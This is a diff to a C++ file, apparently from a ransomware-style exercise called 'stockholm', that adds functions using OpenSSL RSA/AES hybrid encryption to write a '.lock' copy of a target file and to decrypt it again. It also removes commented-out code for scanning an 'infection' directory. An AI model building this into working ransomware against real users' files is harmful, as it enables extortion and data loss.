@@ -8,6 +8,7 @@
 #include <unistd.h>
 #include "log.hpp"
 #include "rsa.hpp"
+#include "sha.hpp"
 
 inline bool filter_extensions(std::string path)
 {
@@ -47,8 +48,62 @@ static fs::path getHomeDir()
 	return fs::path{homedir};
 }
 
-int main(void)
+void LockFile(fs::path keyfile, fs::path file)
 {
+	FILE *fp = fopen(file.c_str(), "rb");
+	BIO *in = BIO_new(BIO_s_mem());
+	if (!in)
+	{
+		LogOpenSSLError();
+		return;
+	}
+	char buf[1024];
+	size_t len;
+	do
+	{
+		len = fread(buf, sizeof(char), 1024, fp);
+		BIO_write(in, buf, len);
+	} while (len > 0);
+
+	BIO *out = BIO_new_file(file.string().append(".lock").c_str(), "wb");
+	if (!out)
+	{
+		BIO_free(in);
+		LogOpenSSLError();
+		return;
+	}
+	rsa_aes_hybrid_encryption(keyfile.c_str(), in, out);
+	BIO_free(in);
+	BIO_free(out);
+}
+
+void UnlockFile(fs::path keyfile, fs::path file)
+{
+
+	BIO *in = BIO_new_file(file.c_str(), "rb");
+	if (!in)
+	{
+		LogOpenSSLError();
+		return;
+	}
+	BIO *out = BIO_new_file(file.replace_extension(".unlock").c_str(), "wb");
+	if (!out)
+	{
+		BIO_free(in);
+		LogOpenSSLError();
+		return;
+	}
+	stockholm::header hdr;
+	rsa_aes_hybrid_decryption(keyfile.c_str(), &hdr, in, out);
+
+	BIO_free(in);
+	BIO_free(out);
+}
+
+int main(int argc, char **argv)
+{
+	if (argc == 1)
+		return (1);
 	char *cwd = getcwd(NULL, 0);
 	if (!cwd)
 		return (1);
@@ -66,12 +121,11 @@ int main(void)
 		log(strerror(errno));
 		return (1);
 	}
+
 	if (!create_local_rsa_id((startupCwd / "public.pem").c_str()))
 		return (1);
-
-	// auto files = RetrieveFilesFrom(infectionDir);
-	// std::list<std::string> filtered_files;
-	// std::copy_if(files.begin(), files.end(), std::back_inserter(filtered_files), filter_extensions);
-	// std::cout << filtered_files.size() << std::endl;
-	// EncryptFile("/home/tblochet/infection/toto.txt");
+	fs::path target = fs::path(argv[1]);
+	fs::path lTarget = fs::path().assign(target).string().append(".lock");
+	LockFile(startupCwd / "public.pem", target);
+	UnlockFile(startupCwd / "private.pem", lTarget);
 }
